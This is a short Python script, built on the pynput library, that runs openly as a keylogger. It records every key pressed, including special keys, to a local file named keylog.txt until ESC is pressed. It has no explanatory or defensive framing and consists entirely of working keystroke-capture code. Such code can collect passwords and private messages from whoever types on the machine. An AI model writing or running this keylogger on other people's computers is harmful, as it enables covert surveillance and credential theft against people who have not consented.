from pynput import keyboard

# Path to save the log file
log_file = "keylog.txt"

def on_press(key):
    """
    Function to handle the key press events and log the key to the file.
    """
    try:
        # Try logging the character key pressed (a-z, 0-9, etc.)
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like Shift, Ctrl, Arrow keys, etc.)
        with open(log_file, "a") as f:
            f.write(f" [{str(key)}] ")

def on_release(key):
    """
    Function that triggers when a key is released.
    It can also be used to stop the listener.
    """
    # Stop the listener if 'esc' is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    """
    Starts the keylogger to record all key presses.
    """
    # Set up the listener to capture keystrokes
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Starting keylogger... Press 'ESC' to stop.")
    start_keylogger()
